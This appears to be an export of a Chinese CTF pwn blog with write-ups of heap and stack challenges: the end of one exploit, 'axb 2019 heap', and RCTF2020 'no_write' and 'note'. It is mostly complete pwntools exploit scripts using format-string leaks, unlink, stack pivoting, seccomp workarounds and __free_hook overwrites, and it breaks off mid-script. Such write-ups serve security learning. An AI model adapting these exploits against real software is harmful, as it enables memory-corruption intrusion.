class="number">3</span>,<span class="number">0x70</span>,<span class="number">0x68</span>*<span class="string">'b'</span>+p64(<span class="number">0x513</span>))</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#7</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4fa8</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>] + libc_base</span><br><span class="line">one = libc_base +<span class="number">0xf1147</span><span class="comment"># 0x4526a</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x1b</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">4</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb 2019 heap"></a>axb 2019 heap</h3><p>格式化字符串泄露程序基址和libc基址，off by one打unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./axb_2019_heap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25965</span>)</span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"10):"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"size:"</span>,str(size))</span><br><span class="line">    sl(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"name:"</span>,<span class="string">"%14$p%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">elf_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1200</span></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">"elf_base:"</span>+hex(elf_base))</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(elf_base+<span class="number">0x202048</span>)+p64(elf_base+<span class="number">0x202050</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+p8(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>])+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RCTF2020 部分pwn</title>
      <link href="/2020/06/06/RCTF2020-pwn/"/>
      <url>/2020/06/06/RCTF2020-pwn/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>比赛没时间打，赛后复现几道题目玩玩。</p><h3 id="no-write"><a href="#no-write" class="headerlink" title="no_write"></a>no_write</h3><p>这道题禁用了write，需要用到栈迁移配合__libc_start_mian来获取syscall以及gadget的多次利用</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>checksec，No PIE、No canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/RCTF/pwn/no_write_attachment/no_write&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>查看程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  read_n(&amp;v4, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的栈溢出，但是根据题目似乎是禁用了一些函数</p><p>seccomp查看沙箱机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  no_write_attachment seccomp-tools dump ./no_write</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>发现只能使用open、read、exit</p><p>此时可以想到，将flag读到bss段上，然后逐个字节爆破。那么问题来了，程序中只有read函数，没有open函数。因此可以进行系统调用，但是程序中不存在syscall，这是就需要得到syscall的地址。</p><p>我们发现在调用__libc_start_main时会在栈上留下syscall附近的地址，因此首先可以通过栈迁移将栈迁移到已知地址，例如bss段。这里可以利用<code>pop rbp；leave ret</code>进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = <span class="number">0x601078</span></span><br><span class="line">leave_ret = <span class="number">0x40070b</span></span><br><span class="line">pop_rbp = <span class="number">0x400588</span></span><br><span class="line"><span class="comment">##stack pivot to bss</span></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x18</span> + csu(read_got,<span class="number">0</span>,bss,<span class="number">0x580</span>)</span><br><span class="line">pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/06/06/RCTF2020-pwn/RCTF2020-no-write/1.png" class="lazyload"></p><p>接下需要调用<code>__libc_start_main</code>函数，需要说明的是：</p><p>此时__libc_start_main函数的返回值为第一个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##__libc_start_main</span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">pop_rsp = <span class="number">0x40076d</span></span><br><span class="line">syscall = <span class="number">0x6014d8</span></span><br><span class="line">pay = <span class="string">'flag'</span></span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x500</span>-len(pay))</span><br><span class="line">pay += csu(elf.got[<span class="string">'__libc_start_main'</span>],pop_rdi,<span class="number">0</span>,bss+<span class="number">0x20</span>)<span class="comment">#p64(0x400544)</span></span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x580</span>-len(pay))</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/06/06/RCTF2020-pwn/RCTF2020-no-write/2.png" class="lazyload"></p><p>接下来的思路如下：</p><ol><li>将0x6014d8的最低字节改为’\x7f’，使之成为syscall地址</li><li>利用read的返回值改写rax的值为2，即open函数的系统调用号</li><li>将flag写入bss</li></ol><p>然后是爆破flag，可以利用__libc_csu_init中的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400750                 mov     rdx, r15</span><br><span class="line">.text:0000000000400753                 mov     rsi, r14</span><br><span class="line">.text:0000000000400756                 mov     edi, r13d</span><br><span class="line">.text:0000000000400759                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040075D                 add     rbx, 1</span><br><span class="line">.text:0000000000400761                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400764                 jnz     short loc_400750</span><br><span class="line">.text:0000000000400766</span><br><span class="line">.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400766                 add     rsp, 8</span><br><span class="line">.text:000000000040076A                 pop     rbx</span><br><span class="line">.text:000000000040076B                 pop     rbp</span><br><span class="line">.text:000000000040076C                 pop     r12</span><br><span class="line">.text:000000000040076E                 pop     r13</span><br><span class="line">.text:0000000000400770                 pop     r14</span><br><span class="line">.text:0000000000400772                 pop     r15</span><br><span class="line">.text:0000000000400774                 retn</span><br></pre></td></tr></table></figure><p>具体思路如下：</p><ol><li>使rbp得值为flag单字节</li><li>使rbx为猜测值进行爆破</li><li>利用0x40075d处gadget进行比较</li></ol><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(r12,r13,r14,r15)</span>:</span></span><br><span class="line">    pay = p64(<span class="number">0x40076a</span>)</span><br><span class="line">    pay += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    pay += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    pay += p64(r12) <span class="comment">#call_func</span></span><br><span class="line">    pay += p64(r13) <span class="comment">#edi</span></span><br><span class="line">    pay += p64(r14) <span class="comment">#rsi</span></span><br><span class="line">    pay += p64(r15) <span class="comment">#rdx</span></span><br><span class="line">    pay += p64(<span class="number">0x400750</span>)</span><br><span class="line">    pay += <span class="string">'\x00'</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    i = <span class="number">47</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        p = process(<span class="string">"./no_write"</span>)</span><br><span class="line">        elf = ELF(<span class="string">"./no_write"</span>)</span><br><span class="line">        read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">        bss = <span class="number">0x601078</span></span><br><span class="line">        leave_ret = <span class="number">0x40070b</span></span><br><span class="line">        pop_rbp = <span class="number">0x400588</span></span><br><span class="line">        <span class="comment">##stack pivot to bss</span></span><br><span class="line">        pay = <span class="string">'a'</span>*<span class="number">0x18</span> + csu(read_got,<span class="number">0</span>,bss,<span class="number">0x580</span>)</span><br><span class="line">        pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br><span class="line">        p.send(pay)</span><br><span class="line">        <span class="comment">##__libc_start_main</span></span><br><span class="line">        pop_rdi = <span class="number">0x400773</span></span><br><span class="line">        pop_rsp = <span class="number">0x40076d</span></span><br><span class="line">        syscall = <span class="number">0x6014d8</span></span><br><span class="line">        pay = <span class="string">'flag'</span></span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x38</span>-len(pay))</span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,syscall,<span class="number">0x1</span>)</span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,bss+<span class="number">0x580</span>,<span class="number">0x2</span>)</span><br><span class="line">        pay += csu(syscall,bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        flag_addr = <span class="number">0x601318</span></span><br><span class="line">        pay += csu(read_got,<span class="number">3</span>,bss+<span class="number">0x580</span>,j)</span><br><span class="line">        pay += csu(read_got,<span class="number">3</span>,flag_addr,<span class="number">0x1</span>)</span><br><span class="line">        pay += p64(<span class="number">0x40076a</span>) + p64(i) + p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        pay += p64(<span class="number">0x40075d</span>) + p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">        pay += csu(read_got,<span class="number">0</span>,bss+<span class="number">0x580</span>,<span class="number">0x10</span>)*<span class="number">2</span></span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x480</span>-len(pay))</span><br><span class="line">        pay += p64(pop_rsp)+p64(<span class="number">0</span>)*<span class="number">0xf</span> + csu(elf.got[<span class="string">'__libc_start_main'</span>],pop_rdi,<span class="number">0</span>,bss+<span class="number">0x20</span>)</span><br><span class="line">        pay += <span class="string">'\x00'</span>*(<span class="number">0x580</span>-len(pay))</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        p.send(pay)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(<span class="string">'\x7f'</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(<span class="string">'az'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">            p.send(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">            p.recv(<span class="number">1</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">            flag += chr(i+<span class="number">1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        print(i)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">53</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这道题得难点在于栈帧的控制，需要不断地调试。</p><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>这道题存在多处漏洞，负数索引、乘法溢出、堆溢出、off by null。这里利用较为简单的负数索引以及乘法溢出来get shell</p><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>64位程序，保护全开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004008 off_4008        dq offset off_4008      ; DATA XREF: sub_1260+1B↑r</span><br><span class="line">.data:0000000000004008                                         ; .data:off_4008↓o</span><br><span class="line">.data:0000000000004010 qword_4010      dq 996h                 ; DATA XREF: add+C↑r</span><br><span class="line">.data:0000000000004010                                         ; add+AC↑r ...</span><br><span class="line">.data:0000000000004018 dword_4018      dd 1                    ; DATA XREF: sub_18D1+18↑r</span><br><span class="line">.data:0000000000004018                                         ; sub_18D1+27↑r ...</span><br><span class="line">.data:0000000000004018 _data           ends</span><br></pre></td></tr></table></figure><p>程序的所有索引都没有检查负数边界，因此可以直接溢出到0x4008处，索引为<code>-5</code></p><p>隐藏功能6会调用malloc，且大小为0x50，add函数则使用calloc</p><p>隐藏功能7有32字节溢出</p><p>具体思路如下：</p><ol><li>show(-5)泄露libc地址，计算出__free_hook和one_gadget</li><li>利用隐藏功能7修改tcache</li><li>利用隐藏功能6将__free_hook改为one_gadget</li></ol><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./note"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.30.so"</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,msg)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Message:"</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">super_buy</span><span class="params">(name)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"6"</span>)</span><br><span class="line">    sl(<span class="string">"name:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_more</span><span class="params">(idx,msg)</span>:</span></span><br><span class="line">    sl(<span class="string">"Choice:"</span>,<span class="string">"7"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    s(<span class="string">"Message:"</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">show(<span class="number">-5</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">data_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x1eb6a0</span></span><br><span class="line">log.success(<span class="string">"data_addr:"</span>+hex(data_addr))</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10afa9</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+hex(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#set onegadget in __free_hook</span></span><br><span class="line">edit(<span class="number">-5</span>,p64(data_addr)+p64(<span class="number">0x1000000</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">-5</span>,p64(data_addr)+p64(<span class="number">0x1000000</span>)+<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit_more(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>)+p64(free_hook))</span><br><span class="line">super_buy(<span class="string">"kangel"</span>)</span><br><span 